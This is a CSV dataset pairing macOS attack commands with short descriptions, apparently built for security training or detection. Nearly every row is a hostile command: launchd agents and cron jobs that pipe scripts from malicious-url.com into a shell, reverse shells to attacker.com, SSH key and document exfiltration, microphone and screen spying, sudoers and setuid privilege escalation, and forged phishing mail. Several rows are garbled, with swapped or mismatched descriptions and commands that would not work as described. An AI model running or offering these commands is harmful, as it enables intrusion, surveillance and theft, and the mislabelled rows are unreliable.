"cmd","description"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/payload.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launchd by loading a malicious agent to execute a payload script periodically."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist that establishes a reverse shell on system startup."
"scp ~/.ssh/id_rsa user@remote-server:/path/to/store/keys","Exfiltrating SSH private keys to a remote server."
"openssl enc -aes-256-cbc -in /path/to/payload -out /tmp/encrypted_payload -pass pass:YourPassword && chmod +x /tmp/encrypted_payload && /tmp/encrypted_payload","Encrypting a payload before executing it to evade detection."
"0 * * * * /usr/bin/curl -s http://malicious-url.com/script.sh | /bin/bash","Persistence via cron job to download and execute a script every hour."
"osascript -e 'do shell script ""chmod +s /bin/bash"" with administrator privileges'","Privilege escalation by exploiting patched kernel vulnerability CVE-2021-30807 on macOS system."
"sudo kextload /Library/Extensions/malicious.kext","Persistence via malicious kernel extension loaded at boot time."
"profiles -I -F /path/to/malicious.mobileconfig","Installing a malicious configuration profile to change system settings."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/script.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > /Library/LaunchDaemons/com.malicious.daemon.plist && launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Creating a launch daemon to execute a script periodically."
"while true; do screencapture -x ~/Library/.hidden/$(date +%Y%m%d%H%M%S).png; sleep 60; done","A script that takes screenshots of the user's screen every minute and saves them with a timestamp in a hidden directory."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file to maintain access to a macOS system."
"Persistence via malicious plist to execute a keylogger at login.","A scenario where a keylogger is installed via a trojanized application to capture user input."
"echo 'echo ""while true; do cat /dev/input/event0 > /tmp/input-logs.txt; done"" >> ~/.login' > ~/Library/LaunchAgents/com.hidden.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.hidden.keylogger.plist","What does the malicious code snippet look like for that scenario?"
"osascript -e 'set volume input volume 100' && while :; do sox -d -t mp3 - | curl -F 'voice=@-' http://attacker.com/upload.php; sleep 300; done","Activating the microphone remotely on a macOS system for monitoring purposes."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /etc/apache2/other/httpd-default.conf && apachectl restart","Persistence mechanism using default Apache server configurations on macOS to maintain remote access."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/RemoteAccessTool.app"", hidden:false}'","Persistence via login item addition using AppleScript to open a remote access tool at login."
"function sudo() { curl http://malicious-url.com/evilscript.sh | bash; } && export -f sudo","Privilege escalation by exploiting sudo misconfigurations through alias and function overrides to create a fake sudo command."
"osascript -e 'do shell script ""curl http://malicious-url.com/payload.sh -o ~/Library/Scripts/payload.sh && chmod +x ~/Library/Scripts/payload.sh && ~/Library/Scripts/payload.sh"" with administrator privileges'","Malware installation via a trojanized document received through email that executes a shell command when opened."
"openssl enc -aes-256-cbc -salt -in ~/Documents/targetfile.doc -out ~/Documents/encryptedfile.enc && crontab -l | { cat; echo ""0 3 * * * openssl enc -aes-256-cbc -d -in ~/Documents/encryptedfile.enc | nc -w 3 attacker.com 4444""; } | crontab -","Automatic transmission of documents from a macOS system using a scheduled cron job with prior encryption of data."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.plist</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/script.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
		<string>;</string>
		<string>/bin/bash</string>
		<string>/tmp/script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to maintain remote access."
"osascript -e 'repeat' -e 'delay 10' -e 'set theApps to """"' -e 'set theList to the name of every process whose visible is true' -e 'repeat with theItem in theList' -e 'set theApps to theApps & theItem & "",""' -e 'end repeat' -e 'do shell script ""echo "" & theApps & "" >> ~/Library/Logs/app_usage.log""' -e 'end repeat'","Data exfiltration through keylogging and recording application usage to identify frequently used applications."
"screencapture -x ~/Desktop/screenshot.jpg && osascript -e 'set the clipboard to (read (POSIX file ""~/Desktop/screenshot.jpg"") as JPEG picture)'","Automated screen capture and clipboard image extraction for data exfiltration on a macOS system."
"defaults read com.apple.finder.plist ClipboardHistory | grep -Eo '~[^ ]+\.png' | xargs -I{} cp {} ~/Desktop/clipboard_images/","Extracting the history of images copied to the clipboard on macOS."
"sudo kextload /Library/Extensions/malicious.kext","Persistence through a malicious kernel extension loaded at boot time."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Adding a login item to execute a script every time the user logs in."
"sudo defaults write com.apple.loginwindow LoginHook /path/to/script.sh","Creating a login hook to run a script when any user logs in."
"echo 'malicious.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7' >> ~/.ssh/known_hosts","Persistence via SSH known hosts poisoning to redirect users to malicious servers."
"ssh -fN -R 2222:localhost:22 user@malicious.com","Establishing a reverse SSH tunnel for port forwarding to allow unauthorized access to internal services."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...' >> ~/.ssh/authorized_keys","Abusing SSH to maintain persistent remote access by adding an unauthorized public key to the authorized_keys file."
"mkdir -p ~/Library/LaunchAgents && echo '{""Label"":""com.malicious.agent"",""ProgramArguments"":[""/usr/bin/curl"",""-o"",""/tmp/malicious.sh"",""http://malicious-url.com/script.sh"",""&&"",""chmod"",""+x"",""/tmp/malicious.sh"",""&&"",""/tmp/malicious.sh""],""RunAtLoad"":true}' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism using a launch agent to execute a script every log in."
"osascript -e 'do shell script ""launchctl load /Library/LaunchDaemons/com.malicious.plist"" with administrator privileges'","Injecting code into a privileged process to escalate privileges on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"find ~/Documents -type f -name '*.pdf' -exec scp {} user@attacker.com:/target_path/ \;","Exfiltrating sensitive files from the macOS system."
"echo '1.2.3.4 example.com' | sudo tee -a /etc/hosts","Manipulating the system's network configuration to redirect traffic."
"while true; do find /some/important/directory -type f -mmin -1 -exec echo {} >> /tmp/directory_access.log \;; sleep 60; done","Persistence by monitoring directory changes and logging directory access in macOS."
"open /Volumes/MaliciousDrive/Payload.app","Infection of a macOS system through a malicious payload disguised within an email attachment."
"defaults write com.apple.mail EnableBundles -bool true && defaults write com.apple.mail BundleCompatibilityVersion -string 3 && cp -a /path/to/malicious.mailbundle ~/Library/Mail/Bundles/","Using email spoofing techniques to make an email appear as if it's coming from a trusted source."
"echo 'From: ""Trusted Source"" <malicious@phishing.com>' | sendmail -f fake@trustedsource.com victim@targetdomain.com","Exploiting display name deception in email clients to mask the sender's identity."
"defaults write com.apple.safari IncludeInternalDebugMenu 1 && defaults read ~/Library/Safari/History.db 'select visit_time, title, url from history_visits inner join history_items on history_items.id = history_visits.history_item;' > ~/Desktop/safari_history.txt","Persistent tracking of user web browsing history on macOS."
"open /path/to/malicious/attachment","Malware installation through the execution of a malicious payload received via an email attachment."
"osascript -e 'do shell script ""bash -i >& /dev/tcp/attacker.com/4444 0>&1""'","Executing a script embedded in an email to establish a backdoor."
"sendmail -f forged@example.com victim@example.com < /path/to/malicious/message","Forging the sender address in an email to disguise the origin of a phishing attack."
"curl -s http://example.com/malicious_script.sh | sh","Malware installation using a disguised curl command to download and execute a script."
"cd /usr/local/bin && curl -s http://example.com/rootkit -o .hidden_rootkit && chmod +x .hidden_rootkit && ./.hidden_rootkit","Rootkit embedding through a hidden file in the system directory."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n <key>Label</key>\n <string>com.malicious.daemon</string>\n <key>ProgramArguments</key>\n <array>\n <string>/usr/local/bin/malicious_program</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.malicious.daemon.plist && launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist","Establishing boot persistence for a malicious program using launchd."
"hdiutil create -size 100m -fs 'HFS+J' -volname 'Backup' hidden_volume.dmg && hdiutil attach hidden_volume.dmg -hidden && cp /path/to/malicious_file /Volumes/Backup/","Volume shadow copy exploitation to hide malicious activity."
"find / -perm +6000 -type f -exec ls -ld {} \;","Identification of files with the setuid or setgid bit set, which can be indicative of privilege escalation attempts."
"echo '0 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh' >> ~/.crontab && crontab ~/.crontab","Persistence via a hidden cron job that downloads and executes a script every hour"
"echo 'standard_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","A scenario where the sudoers file is modified to grant admin privileges to a standard user account without authorization."
"cp /bin/sh /tmp/privileged_sh && chmod +s /tmp/privileged_sh","Privilege escalation by exploiting a setuid binary on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.hourlytask</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-fsSL</string>
		<string>http://malicious-url.com/script.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>StartInterval</key>
	<integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.hourlytask.plist && launchctl load ~/Library/LaunchAgents/com.malicious.hourlytask.plist","Persistence via LaunchAgent that executes a script every hour"
